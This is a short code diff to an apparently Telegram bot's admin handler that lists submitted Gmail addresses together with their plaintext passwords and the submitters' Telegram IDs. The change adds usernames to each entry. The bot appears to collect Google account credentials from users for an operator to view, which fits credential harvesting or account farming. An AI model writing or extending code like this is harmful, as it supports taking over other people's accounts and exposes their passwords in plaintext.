@@ -96,10 +96,11 @@ async def view_gmails(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text = f"📧 <b>Recent Gmails</b> ({len(gmails)}):\n\n"
         for i, g in enumerate(gmails, 1):
             date = g["submitted_at"].strftime("%m/%d %H:%M")
+            uname = f"@{g['username']}" if g.get('username') else g.get('full_name', '—')
             text += (
                 f"<b>{i}.</b> <code>{g['email']}</code>\n"
                 f"   🔑 <tg-spoiler>{g['password']}</tg-spoiler>\n"
-                f"   👤 <code>{g['telegram_id']}</code> • {date}\n\n"
+                f"   👤 {uname} (<code>{g['telegram_id']}</code>) • {date}\n\n"
             )
 
     await query.edit_message_text(text, parse_mode="HTML", reply_markup=admin_back_keyboard(lang))
